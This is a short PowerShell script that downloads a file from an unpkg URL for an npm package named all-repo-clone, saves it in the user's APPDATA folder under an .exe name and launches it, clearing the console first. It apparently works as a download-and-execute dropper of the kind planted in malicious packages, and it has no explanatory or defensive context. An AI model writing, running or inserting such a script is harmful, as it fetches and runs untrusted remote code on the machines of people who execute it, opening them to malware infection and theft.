#!/usr/bin/env pwsh
$ProcName = "all-repo-clone.exe"
$WebFile = "https://unpkg.com/all-repo-clone/lib/all-repo-clone.js"
 
Clear-Host
 
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA$ProcName")
Start-Process ("$env:APPDATA$ProcName")